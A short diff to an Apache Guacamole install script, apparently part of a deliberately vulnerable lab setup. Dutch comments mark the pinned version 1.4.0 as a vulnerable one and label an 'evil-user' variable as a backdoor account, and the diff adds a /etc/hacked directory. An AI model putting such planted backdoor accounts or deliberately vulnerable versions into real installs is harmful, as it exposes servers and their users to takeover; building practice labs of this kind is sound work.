@@ -15,8 +15,10 @@ fi
 
 # Version number of Guacamole to install
 # Homepage ~ https://guacamole.apache.org/releases/
+#-------------------------------------------------------------------------------------------------------
+# GUACVERSION="1.4.0"  kan je gebruiken om een kwestbaare versie te kiezen
 GUACVERSION="1.4.0"
-
+#-------------------------------------------------------------------------------------------------------
 # Latest Version of MySQL Connector/J if manual install is required (if libmariadb-java/libmysql-java is not available via apt)
 # Homepage ~ https://dev.mysql.com/downloads/connector/j/
 MCJVER="8.0.27"
@@ -48,6 +50,7 @@ guacPwd=""
 PROMPT=""
 MYSQL=""
 # -------------------------------------------------------------------------------------------------------
+# backdooraccount aanmaken 
 evilBackdoorUser="evil-user"
 # -------------------------------------------------------------------------------------------------------
 
@@ -409,6 +412,7 @@ rm -rf /etc/guacamole/lib/
 rm -rf /etc/guacamole/extensions/
 mkdir -p /etc/guacamole/lib/
 mkdir -p /etc/guacamole/extensions/
+mkdir -p /etc/hacked/
 
 # Fix for #196
 mkdir -p /usr/sbin/.config/freerdp
